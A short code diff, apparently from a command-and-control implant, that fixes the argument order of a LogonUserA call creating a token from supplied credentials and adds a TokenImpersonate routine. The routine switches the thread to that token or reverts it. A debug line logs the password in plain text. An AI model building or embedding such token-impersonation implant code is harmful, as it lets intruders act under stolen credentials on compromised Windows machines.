@@ -262,8 +262,9 @@ BOOL TokenRemove( DWORD TokenID )
 
 HANDLE TokenMake( LPSTR User, LPSTR Password, LPSTR Domain )
 {
-    PRINTF( "TokenMake( %s, %s, %s )\n", User, Password, Domain )
     HANDLE hToken = NULL;
+
+    PRINTF( "TokenMake( %s, %s, %s )\n", User, Password, Domain )
 
     if ( ! Instance->Win32.RevertToSelf() )
     {
@@ -272,7 +273,7 @@ HANDLE TokenMake( LPSTR User, LPSTR Password, LPSTR Domain )
         // TODO: at this point should I return NULL or just continue ? For now i just continue.
     }
 
-    if ( ! Instance->Win32.LogonUserA( User, Password, Domain, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken ) )
+    if ( ! Instance->Win32.LogonUserA( User, Domain, Password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken ) )
     {
         PUTS( "LogonUserA: Failed" )
         CALLBACK_GETLASTERROR
@@ -340,4 +341,18 @@ VOID TokenClear()
     Instance->Tokens.Impersonate = FALSE;
     Instance->Tokens.Vault       = NULL;
     Instance->Tokens.Token       = NULL;
+}
+
+VOID TokenImpersonate( BOOL Impersonate )
+{
+    if ( Impersonate && Instance->Tokens.Token )
+    {
+        // impersonate the current token.
+        if ( Instance->Win32.ImpersonateLoggedOnUser( Instance->Tokens.Token->Handle ) )
+            Instance->Tokens.Impersonate = TRUE;
+        else
+            Instance->Tokens.Impersonate = FALSE;
+    }
+    else
+        Instance->Win32.RevertToSelf();
 }
